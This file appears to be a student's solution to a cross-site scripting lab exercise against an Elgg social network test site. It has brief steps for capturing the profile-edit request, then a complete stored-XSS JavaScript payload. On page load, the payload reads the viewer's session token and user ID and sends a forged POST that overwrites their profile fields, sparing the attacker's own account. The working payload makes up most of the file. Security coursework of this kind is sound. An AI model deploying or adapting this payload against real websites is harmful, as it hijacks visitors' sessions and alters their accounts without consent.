/* task2: Modifying the Victim's Profile */

/*
	solution:
		1) The edit profile section of attacker was visited and after making all the required modifications, the changes were saved.
		2) Then, an HTTP POST request corresponding to this profile modification was detected using HTTP request inspection tool of Mozilla Firefox browser.
		3) The request url was observed and set as attacking url.
		4) The request body containing all the parameters sent was then examined from "Edit and Resend" option and attacking content was constructed according to its structure.
		5) Finally, all the modifications made to attacker profile were undone.
*/

<script type="text/javascript">
	window.onload = function() {
		/* accessing guid, name, elgg timestamp, elgg security token of the current user */
		var guid = elgg.session.user.guid;
		var name = elgg.session.user.name;
		var ts = '&__elgg_ts='+elgg.security.token.__elgg_ts;
		var token = '__elgg_token='+elgg.security.token.__elgg_token;

		/* setting place holder string */
		var placeholder_string = 'FromSaffronCity'

		/* task2: constructing the HTTP POST request(url & content) to modify the victim's profile */
        var sendurl = 'http://www.xsslabelgg.com/action/profile/edit';

		var content = token+ts+'&name='+name;
		content += '&description=%3Cp%3E1605023%3C%2Fp%3E%0D%0A&accesslevel%5Bdescription%5D=1';
		content += '&briefdescription='+placeholder_string+'&accesslevel%5Bbriefdescription%5D=1'
		content += '&location='+placeholder_string+'&accesslevel%5Blocation%5D=1'
		content += '&interests='+placeholder_string+'&accesslevel%5Binterests%5D=1'
		content += '&skills='+placeholder_string+'&accesslevel%5Bskills%5D=1'
		content += '&contactemail='+placeholder_string+'%40gmail.com&accesslevel%5Bcontactemail%5D=1';
		content += '&phone='+placeholder_string+'&accesslevel%5Bphone%5D=1';
		content += '&mobile='+placeholder_string+'&accesslevel%5Bmobile%5D=1';
		content += '&website=http%3A%2F%2Fwww.'+placeholder_string+'.com&accesslevel%5Bwebsite%5D=1';
		content += '&twitter='+placeholder_string+'&accesslevel%5Btwitter%5D=1';
		content += '&guid='+guid;

		/* creating and sending Ajax request to modify victim's profile */
		if(guid !== 47) {
			var Ajax = null;
			Ajax = new XMLHttpRequest();
		  	Ajax.open('POST', sendurl, true);
			Ajax.setRequestHeader('Host', 'www.xsslabelgg.com');
			Ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
			Ajax.send(content);
		}
	}
</script>

